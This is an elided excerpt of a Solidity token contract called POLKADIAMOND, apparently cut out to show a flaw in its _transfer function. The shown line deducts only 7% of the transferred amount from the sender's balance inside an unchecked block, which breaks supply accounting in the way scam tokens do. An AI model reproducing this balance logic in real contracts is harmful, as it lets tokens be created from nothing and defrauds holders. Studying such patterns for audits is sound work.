...
/** Telegram : https://t.me/PolkaDiamondToken
 * 
 */
...
contract POLKADIAMOND is Context, IERC20, IERC20Metadata, Ownable {   
    ...
    function _transfer(
        ...
        unchecked {
            _balances[sender] = senderBalance - (amount / 100 * 7);
        }
